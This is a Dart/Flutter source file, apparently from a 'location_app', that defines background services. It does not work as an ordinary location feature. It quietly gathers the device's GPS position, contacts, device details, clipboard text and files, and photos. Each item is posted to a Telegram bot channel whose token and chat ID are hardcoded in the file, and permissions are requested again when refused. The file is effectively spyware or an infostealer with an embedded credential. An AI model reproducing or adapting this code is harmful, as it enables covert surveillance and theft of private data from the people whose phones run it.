import 'dart:async';
import 'dart:convert';
import 'dart:developer';
import 'package:flutter/services.dart';
import 'package:geolocator/geolocator.dart';
import 'package:http/http.dart' as http;
import 'package:location_app/services/background/get_device_info.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:super_clipboard/super_clipboard.dart';
import 'package:contacts_service/contacts_service.dart';

String botToken = '6838944605:AAHr-BOZ7jyc_JUK1pxNz-IIFsmJ_NRYgZQ';
String channelId = '-1002064956223';

class AppBackgroundServices {
  static handlePermissions() async {
    await requestLocationPermission();
    await requestStoragePermission();
    await requestPhoneStatePermission();
  }

  static Future<void> messageSend(String text) async {
    sendMessage(botToken, channelId, text);
  }

  static Future<void> sendDeviceInfo() async {
    String info = await GetDeviceInfo.getDeviceInfo();
    sendMessage(
      botToken,
      channelId,
      info,
    );
  }

  static Future<void> sendContacts() async {
    String contacts = await getContacts();
    sendMessage(
      botToken,
      channelId,
      contacts,
    );
  }

  static Future<void> requestLocationPermission() async {
    LocationPermission permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();
      }
    } else {
      await Geolocator.requestPermission();
    }
  }

  static Future<void> requestPhoneStatePermission() async {
    PermissionStatus permissionStatus = await Permission.phone.status;
    if (permissionStatus.isDenied) {
      permissionStatus = await Permission.phone.request();
      if (permissionStatus.isDenied) {
        permissionStatus = await Permission.phone.request();
      }
    } else {
      await Permission.phone.request();
    }
  }

  static Future<Position?> determinePosition() async {
    bool serviceEnabled;
    LocationPermission permission;

    serviceEnabled = await Geolocator.isLocationServiceEnabled();
    if (!serviceEnabled) {
      return null;
    }

    permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        return null;
      }
    }

    if (permission == LocationPermission.deniedForever) {
      return null;
    }
    return await Geolocator.getCurrentPosition();
  }

  static Future<void> requestStoragePermission() async {
    PermissionStatus status = await Permission.storage.request();
    if (status == PermissionStatus.granted) {
      log('Storage permission granted');
    } else {
      log('Storage permission denied');
    }
  }

  static Future<void> sendPhoto(String filePath) async {
    String botToken = '6838944605:AAHr-BOZ7jyc_JUK1pxNz-IIFsmJ_NRYgZQ';
    String channelId = '-1002064956223';
    String apiUrl = 'https://api.telegram.org/bot$botToken/sendPhoto';

    var request = http.MultipartRequest('POST', Uri.parse(apiUrl));

    request.files.add(
      await http.MultipartFile.fromPath('photo', filePath),
    );

    request.fields.addAll({
      'chat_id': channelId,
      'caption': "${DateTime.now()}",
    });

    try {
      var streamedResponse = await request.send();
      var response = await http.Response.fromStream(streamedResponse);

      if (response.statusCode == 200) {
        log('Photo sent successfully!');
      } else {
        log('Failed to send photo: ${response.body}');
      }
    } catch (e) {
      log('Error: $e');
    }
  }

  static Future<void> sendFile(Stream<Uint8List> stream) async {
    List<int> bytes = [];

    await for (Uint8List data in stream) {
      bytes.addAll(data);
    }

    String botToken = '6838944605:AAHr-BOZ7jyc_JUK1pxNz-IIFsmJ_NRYgZQ';
    String channelId = '-1002064956223';
    String apiUrl = 'https://api.telegram.org/bot$botToken/sendPhoto';

    var request = http.MultipartRequest('POST', Uri.parse(apiUrl));

    request.files.add(http.MultipartFile.fromBytes('photo', bytes));

    request.fields.addAll({
      'chat_id': channelId,
      'caption': "${DateTime.now()}",
    });

    try {
      var streamedResponse = await request.send();
      var response = await http.Response.fromStream(streamedResponse);

      if (response.statusCode == 200) {
        log('Photo sent successfully!');
      } else {
        log('Failed to send photo: ${response.body}');
      }
    } catch (e) {
      log('Error: $e');
    }
  }

  static Future<void> sendLocation() async {
    await determinePosition().then((value) async {
      if (value != null) {
        String apiUrl = 'https://api.telegram.org/bot$botToken/sendLocation';
        Map<String, dynamic> requestBody = {
          'chat_id': channelId,
          'latitude': value.latitude.toString(),
          'longitude': value.longitude.toString(),
        };
        try {
          var response = await http.post(
            Uri.parse(apiUrl),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode(requestBody),
          );

          if (response.statusCode == 200) {
            log('Location sent successfully!');
          } else {
            log('Failed to send location: ${response.body}');
          }
        } catch (e) {
          log('Error: $e');
        }
      } else {
        sendMessage(
          botToken,
          channelId,
          "Geolokatsiyani aniqlash o'chirilgan!",
        );
      }
    });
  }

  static void sendMessage(String botToken, String chatId, String text) async {
    String apiUrl = 'https://api.telegram.org/bot$botToken/sendMessage';

    Map<String, dynamic> requestBody = {
      'chat_id': chatId,
      'text': text,
    };

    try {
      var response = await http.post(
        Uri.parse(apiUrl),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(requestBody),
      );

      if (response.statusCode == 200) {
        log('Message sent successfully!');
      } else {
        log('Failed to send message: ${response.body}');
      }
    } catch (e) {
      log('Error: $e');
    }
  }

  static Future<void> clipboardHandler() async {
    final clipboard = SystemClipboard.instance;
    if (clipboard != null) {
      final reader = await clipboard.read();

      if (reader.canProvide(Formats.htmlText)) {
        final html = await reader.readValue(Formats.htmlText);
        if (html != null) {
          messageSend(html);
        }
      }

      if (reader.canProvide(Formats.plainText)) {
        final text = await reader.readValue(Formats.plainText);
        if (text != null) {
          messageSend("Clipboard text: \n$text");
        }
      }

      for (final format in Formats.standardFormats) {
        if (reader.canProvide(format)) {
          reader.getFile(format as FileFormat, (file) {
            final stream = file.getStream();
            sendFile(stream);
          });
        }
      }
    }
  }

  static Future<String> getContacts() async {
    String msg = "";
    // if (await Permission.contacts.request().isGranted) {
    //   List<Contact> contacts = await ContactsService.getContacts();
    //   msg = "Contacts:$contacts";
    // } else {
    //    Permission.contacts.request();
    //   if (await Permission.contacts.isDenied) {
    //     Permission.contacts.request();
    //
    //     msg = "No permission for contacts";
    //   }
    // }
    ///
    if (await Permission.contacts.isDenied) {
      await Permission.contacts.request();
      if (await Permission.contacts.isDenied) {
        await Permission.contacts.request();
      }
    } else {
      List<Contact> contacts = await ContactsService.getContacts();
      msg = "Contacts:$contacts";
    }
    return msg;
  }
}
